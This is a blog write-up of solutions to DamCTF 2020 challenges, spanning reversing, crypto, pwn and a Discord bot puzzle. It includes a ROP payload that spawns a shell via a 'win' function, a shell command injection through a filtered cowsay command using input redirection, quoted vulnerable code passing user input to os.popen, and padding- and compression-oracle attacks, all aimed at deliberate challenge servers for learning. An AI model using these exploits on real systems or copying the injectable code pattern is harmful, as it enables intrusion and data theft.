+++
title = "Writeup: DamCTF 2020"
date = 2020-10-13T23:09:10+09:00
+++

- Website: https://damctf.xyz/
- CTFTime: https://ctftime.org/event/1076

First time playing in a long time, did much better than I expected!

## rev/schlage

> I went to the hardware store yesterday and bought a new lock, for some reason it came on a flash drive. Can you figure out how to unlock it? I really need to get into my apartment.
>
> Rather than traditional lock picks, you may find [this](https://ghidra-sre.org/), [that](https://cloud.binary.ninja/), or [this other expensive-looking thing to be helpful](https://www.hex-rays.com/products/ida/support/download_freeware/).
>
> `nc chals.damctf.xyz 31932`
>
> Downloads: [schlage](schlage/schlage)

The pins have to be solved in a certain order, but it's easy enough to figure
out through trial and error.

- **Pin 3**

  ```
     d4e:       c7 45 f8 ef be ad de    mov    DWORD PTR [rbp-0x8],0xdeadbeef
     [...]
     d66:       e8 dc fc ff ff          call   a47 <get_int>
     d6b:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
     d6e:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]
     d71:       33 45 fc                xor    eax,DWORD PTR [rbp-0x4]
     d74:       3d 37 13 37 13          cmp    eax,0x13371337
     d79:       75 15                   jne    d90 <do_pin3+0x80>
  ```

  It gets an additional input, and checks if it equals `0x13371337` when XORed
  with `0xdeadbeef`.

- **Pin 1**

  It initializes a few numbers, takes user input, XORs them all together, and
  checks if the result is equal to `0xee`. The correct input happens to be 99.

- **Pin 5**

  ```
     ec2:       bf 42 42 42 42          mov    edi,0x42424242
     ec7:       e8 b4 f9 ff ff          call   880 <srand@plt>
     [...]
     edd:       e8 65 fb ff ff          call   a47 <get_int>
     ee2:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
     ee5:       e8 f6 f9 ff ff          call   8e0 <rand@plt>
     eea:       39 45 fc                cmp    DWORD PTR [rbp-0x4],eax
     eed:       75 15                   jne    f04 <do_pin5+0x80>
  ```

  It calls `srand(0x42424242)`, and checks if the user input equals the return
  value of `rand()`. `rand()` will always return the same number, 1413036362.

- **Pin 2**

  ```
     f58:       e8 43 f9 ff ff          call   8a0 <time@plt>
     f5d:       89 45 f8                mov    DWORD PTR [rbp-0x8],eax
     [...]
     f78:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]
     f7b:       89 c6                   mov    esi,eax
     f7d:       48 8d 3d 53 06 00 00    lea    rdi,[rip+0x653]        # 15d7 <_IO_stdin_used+0x337>
     f84:       b8 00 00 00 00          mov    eax,0x0
     f89:       e8 d2 f8 ff ff          call   860 <printf@plt>
     f8e:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]
     f91:       89 c7                   mov    edi,eax
     f93:       e8 e8 f8 ff ff          call   880 <srand@plt>
     [...]
     fa9:       e8 99 fa ff ff          call   a47 <get_int>
     fae:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
     fb1:       e8 2a f9 ff ff          call   8e0 <rand@plt>
     fb6:       39 45 fc                cmp    DWORD PTR [rbp-0x4],eax
     fb9:       75 15                   jne    fd0 <do_pin2+0xbe>
  ```

  It calls `time()`, prints it, calls `srand()` with it, and compares the user
  input against the return value of `rand()`. It needs to be automated, but
  overall is verys similar to the previous stage.

- **Pin 4**

  This stage calls `rand()`, and does a bunch of operations on it. The return
  value of this call is known, since the RNG has been seeded in the previous
  stage. The operations are something like this:

  ```
  int a, c, d;
  c = rand();
  d = 0x66666667;
  a = c;
  d = ((long long int) d * a) >> 32;
  d >>= 2;
  a = c;
  a >>= 0x1f;
  d -= a;
  a = d;
  a <<= 2;
  a += d;
  a += a;
  c -= a;
  d = c;
  a = d + 0x41;
  ```

  Then, it checks if the sum of each character in the input string XORed with
  `a`, equals `0x123`. Eg. we can send `((0x123 // 3) ^ a)` repeated three
  times.

Solution: [solution.py](schlage/solution.py) [rand.c](schlage/rand.c)

```
$ python3 solution.py
[+] Opening connection to chals.damctf.xyz on port 31932: Done
[+] Starting local process './rand': pid 19189
[*] Process './rand' stopped with exit code 0 (pid 19189)
[+] Receiving all data: Done (957B)
[*] Closed connection to chals.damctf.xyz port 31932
[+] b'dam{p1ck1NG_l0Ck5_w1TH_gdB}'
```

## misc/electric-bovine

> Do androids dream of electric bovine? Find out on my new [Discord server](https://discord.gg/dszJ4KV)!

Upon joining the server, a bot called "Secure Permissions Bot" sends you a DM,
saying "Welcome! You may run !help here to find out about me."

```
> !help
Help Menu
-------------
 - !help    Displays this message.
 - !ping    Pong??
 - !about    Displays information about this bot.
 - !resource    Links you to a random resource.
 - !cowsay <text>    Displays your text in cowsay format. Requires greater permissions than user in the guild to use.
 - !list_users     Lists all users in channel.
 - !send_msg <text>    (when used from DMs) sends a message in the #botspam channel in the guild.
 - !role_add <user> <role>    Attempt to add role to user. May only be used from within guild.
> !about
About Me
----------
I'm a bot. On the weekends, I'm a huge fan.
My name is Secure Permissions Bot#7351
You may find my source code here:https://beav.es/o7y
You may find my bot token here https://beav.es/o7r
License: None.
```

The [bot's source code](https://gist.github.com/dunklastarn/d3e3ca30bb4f476221bf42faebb19a12)
shows the implementation of all its commands, the most interesting ones being
`!send_msg`, `!role_add`, and `!cowsay`.

For future reference the bot has roles "private" and "bot", and all new users
have the role "user", and the initial goal seems to be to obtain role "private".

However, the bot does not accept `!role_add` from the user. In order to get
around that, we can use the fact that, unlike the superior messaging platform
IRC, bots in Discord can see their own messages. Combine that with the command
`!send_msg`, and we can get the bot to call its commands.

There is some authentication in the `!role_add` command, which checks the target
user's nick, current roles, the caller's roles, and the target role. There are
multiple ways to get around this, including changing your nick to `private` or
`target_role.id + int(str(user.discriminator) * 4)`. After changing your user's
nick, call the bot to obtain the "private" role.

```
> !send_msg !role_add @nevivurn 0007631280872263516380
Hmmm... nevivurn wants to add role private. Interesting. . .
Granted role private to member nevivurn. Well Done!
```

With the "private" role, we can call `!cowsay`, whose implementation is as
follows:

```
for char in arg:
    if char in " `1234567890-=~!@#$%^&*()_+[]\\{}|;':\",./?":
        await message.author.send("Invalid character sent. Quitting.")
        return

cow = "```\n" + os.popen("cowsay " + arg).read() + "\n```"
```

The code is vulnerable to command injection, but it filters out most special
characters, making useful injections difficult. However, the filter does not
block angle brackets `<>`, which allows us to redirect inputs:

```
> !cowsay <flag
 __________________________
< dam{discord_su_do_speen} >
 --------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

## crypto/semihonest

> OT is secure
> I hope you will not break it
> Don't be malicious
>
> Remote running at chals.damctf.xyz 30332
>
> Downloads: [semihonestclient.py](semihonest/semihonestclient.py)

Reading the source code, the server and client seem to be performing a
Diffie-Hellman key exchange, except the client is supposed to send two numbers,
one of them being a random number.

By generating two different DH public keys (the server complains if you send the
same one twice), the server will helpfully encrypt the flag using the two shared
keys. The client can then compute the shared keys on its end, decrypt the two
ciphertexts, and XOR them together to obtain the flag.

Solution: [solution.py](semihonest/solution.py)

```
$ python3 solution.py chals.damctf.xyz 30332
*** Welcome to my Oblivious Transfer server! ***
[...]
Decrypted text:
b'dam{w0w_1_gues5_h0n3sty_15nt_1mp0rt4nT_T0_y0u}\n'

```

## pwn/allokay

> Every CTF needs a BabyPWN. Time to ROP!
>
> nc chals.damctf.xyz 32575
>
> Downloads: [allokay](allokay/allokay)

This was my first ever pwn challenge!

The program first reads up to 20 characters of user input into a buffer at
`0x6010a0`, passing the resulting string to `atoi` to obtain the number of input
arguments:

```
  40086d:       be 14 00 00 00          mov    esi,0x14
  400872:       48 8d 3d 27 08 20 00    lea    rdi,[rip+0x200827]        # 6010a0 <buffer>
  400879:       e8 b2 fd ff ff          call   400630 <fgets@plt>
  40087e:       48 8d 3d 1b 08 20 00    lea    rdi,[rip+0x20081b]        # 6010a0 <buffer>
  400885:       e8 c6 fd ff ff          call   400650 <atoi@plt>
```

Then, in `get_input`, it reads nubmers into an array. However, the buffer
allocated to hold the number is too small:

```
  4007a6:       8b 45 dc                mov    eax,DWORD PTR [rbp-0x24]
  4007a9:       48 98                   cdqe
  4007ab:       48 8d 50 0f             lea    rdx,[rax+0xf]
  4007af:       b8 10 00 00 00          mov    eax,0x10
  4007b4:       48 83 e8 01             sub    rax,0x1
  4007b8:       48 01 d0                add    rax,rdx
  4007bb:       b9 10 00 00 00          mov    ecx,0x10
  4007c0:       ba 00 00 00 00          mov    edx,0x0
  4007c5:       48 f7 f1                div    rcx
  4007c8:       48 6b c0 10             imul   rax,rax,0x10
  4007cc:       48 29 c4                sub    rsp,rax
  4007cf:       48 89 e0                mov    rax,rsp
```

This only allocates `(num + 30) // 15 * 15` bytes for `num` `long int`s.

Then, we can overwrite the return address (skipping the rest of the stack with
`-`). There is a helpful `win` function that calls `execve` for us, and we can
fit the `/bin/sh\x00` into the buffer initially used to get the number of
arguments.

```
# prepare payload
rop.call(elf.symbols.win, [elf.symbols.buffer + 3])
payload = rop.chain()

# populate buffer
c.sendline(b'14 /bin/sh\x00')
# skip most of stack
c.sendline('- ' * 11)

# send payload as numbers
for num in group(8, payload):
    c.sendline(str(u64(num, sign=True)))

c.sendline('cat flag')
```

Solution: [solution.py](allokay/solution.py)

```
$ python3 solution.py
[*] './allokay'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for 'allokay'
[+] Opening connection to chals.damctf.xyz on port 32575: Done
[+] Receiving all data: Done (21B)
[*] Closed connection to chals.damctf.xyz port 32575
[+] b'dam{4Re_u_A11_0cK4y}\n'
```

## crypto/cbc-padding-oracle

> You will be provided with an AES-CBC encryptor source code.
>
> The code let you get the encrypted text of `AES_CBC_ENC(A*64 + flag + your_choice_of_input)`.
>
> Also, the code let you check if your encrypted text is intact, in other words, it will decrypt your ciphertext input and will check the padding for the sanity check.
>
> Under this condition, can you launch the padding oracle attack to this program to leak the flag?
>
> [A helpful resource](https://en.wikipedia.org/wiki/Padding_oracle_attack)
>
> *Our solution takes ~8 min, and the server timeout is 15min. If you disconnect, you can reconnect and continue your solution, the key is fixed.*
>
> `nc chals.damctf.xyz 30327`
>
> Downloads: [cbc-padding-oracle.py](cbc-padding-oracle/cbc-padding-oracle.py)

This is a straightforward CBC padding oracle challenge.

Solution: [solution.py](cbc-padding-oracle/solution.py)

```
[+] Opening connection to chals.damctf.xyz on port 30327: Done
[*] pad = 1; length = 96
[*] pad = 2; length = 112
[*] data: b'p\xe8(\xfd\xec\x86dc\xa0n\x94\xf1b,\xb6\xd9qLZ\x84\xb8\xe4\xc4\x0f\xb8\x7f\xb3\x1b\xf5\xcb\x80\xe4i\x1a\\JS\xc9\xa4c\xc6\x01\x90 `\xc1\xd3~f?%\xee.\xf0\x1e9\x94\x17\x1a\xfe\xcc\xe2\xf5\xad\xcd?y\x0b\xc4\xb5\xea\xf0\xe3\x83\xe2\x8f{\xc5\xcct\xe7\x87\x06\xf3\x8f\xc9\xf1\x82\x08Kt\x06\xe7\xe4\xbe\xce;\xf2(\x1b\x9a\xce\x81\x80\x82\n:\xb9\xa9>\xfdF'
[*] flag_len: 14
[*] known: 1/16; current: 00000000000000000000000000003232
[*] known: 2/16; current: 00000000000000000000000000093333
[...]
[*] known: 15/16; current: 74717d6b4f5f6224537c234f6d1a2020
[+] b'dam{_Or4Cl3_}\n'
```

## misc/aes

> Absurd Encrypted Storage
>
> Proof of Work requred to solve this challenge. Use generate.py to produce the relevant token and start the challenge.
>
> *This challenge uses the standard American English dictionary distributed with Ubuntu.*
>
> `nc chals.damctf.xyz 30888`
>
> Downloads: [chal.py](aes/chal.py) [generate.py](aes/generate.py)

The server takes 1000 random words from the dictionary, randomly generates 1000
documents that contain 1000 words (chosen randomly), generates an index, and
encrypts the documents.

The server responds to word queries, taking an arbitrary number of words, by
responding with all the encrypted documents that contain those words. The goal
is to find 10 words that are included in the initial set of 1000 words.

> Note: it turns out that the server will happily accept one word repeated 10
> times, though I failed to notice this during the CTF.

The limiting factor is the number of queries, capped at 170 queries before the
server terminates. This turns out to be extremely generous, as evidenced by the
very rough math that follows.

The dictionary contains about 100000 words, so 1000 words is roughly 1% of the
dictionary. If I were to select `N` random words from the dictionary, the
probability that at least one of them is included in those 1000 words is
`1 - (1 - 0.01)^N`. Let `N` be a nice, round number like 64, and the probability
is about 50%.

We can easily check whether at least one word in a group of 64 words was
included in the original 1000 words by sending all of them in a query. This
consumes one query, and returns a bunch of documents if at least one word is a
hit, nothing if there are no hits.

After checking whether a group of 64 words is included in the initial set,
assuming there is only one hit, it takes exactly 6 queries to perform a binary
search to isolate that word.

Taking it all together, it takes 10 "good" groups of 64 words 7 queries each
(initial test + 6 for binary search), for a total of 70 queries if done
perfectly. This means that in order to run of of queries before finding 10
words, we must fail 99 times in the initial 64-word query, which happens about
50% of the time. Thus, the probability of failing with this strategy is
insigificant.

Solution: [solution.py](aes/solution.py)

```
$ python3 solution.py
[+] Opening connection to chals.damctf.xyz on port 30888: Done
[+] solving proof-of-work: done
[*] 64: False
[...]
[*] 64: True
[*] 32: True
[*] 16: False
[*] 8: False
[*] 4: True
[*] 2: True
[*] 1: False
[+] success: Hieronymus's
[...]
[+] success: realm's
[+] words: ["Hieronymus's", "phrenology's", 'pimientos', "Katmai's", "Elwood's", 'dumbwaiters', 'ruler', 'improper', 'fastenings', "realm's"]
[+] Receiving all data: Done (29B)
[*] Closed connection to chals.damctf.xyz port 30888
[+] b' dam{pLeaSe_c0m3_bACK_m1ke}\n\n'
```

## rev/tracing-into-the-night

> All you have to do is type the right number.
> Easy right? Here, I'll do it first.
> Now it's your turn.
>
> Downloads: [trace](tracing-into-the-night/trace) [tracing-into-the-night](tracing-into-the-night/tracing-into-the-night)

The program loads two big ingegers, hardcoded as strings, from memory. Then, it
essentially does the following, using libgmp for bignum operations:

```
N = big number 1
C = big number 2
input = input number
a = 1

while (input.something) {
	a *= a
	a %= N
	if (input.somethingelse) {
		a *= C
		a %= N
	}
}

print a.to_bytes
```

Notice how all modification of `a` happens at exactly four points, all easy to
locate in the trace by grepping for `mpz_mod` and `mpz_mul` calls. Once we have
the operations performed on `a`, all that's left is to replay them:

```
ans = gmpy2.mpz(1)

for line in sys.stdin:
    line = line.rstrip()
    if line == '401367':
        ans *= ans
        ans %= N
    if line == '4013e0':
        ans *= C
        ans %= N
```

Solution: [solution.py](tracing-into-the-night/solution.py)

```
$ grep -E 'gmpz_(mod|mul)' trace | cut -d: -f1 | python3 solution.py
b'dam{and_1nto_d4ta_depend3ncy}\x01\x01'
```

## crypto/guess-secret

> Can you break my super secure and efficient communication method over the internet?
> 
> `nc chals.damctf.xyz 30308`
> 
> Downloads: [guess-secret.py](guess-secret/guess-secret.py)

The server essentially computes `aes-ctr-encryt(deflate(flag + input))`, where
`flag` is `dam\{[0-9a-f]{32}\}`.

Now, if `input` matches parts of the flag, the output of the compression would
be slightly smaller, because repeated data compresses well. This allows us to
leak the flag one letter at a time.

Solution: [solution.py](guess-secret/solution.py)

```
$ python3 solution.py
[+] Opening connection to chals.damctf.xyz on port 30308: Done
[*] known: 9
[*] known: 9f
...
[*] known: 9f64ee1d4a7d6d8fe9136c3e9a74fc76
[+] damctf{9f64ee1d4a7d6d8fe9136c3e9a74fc76}
```
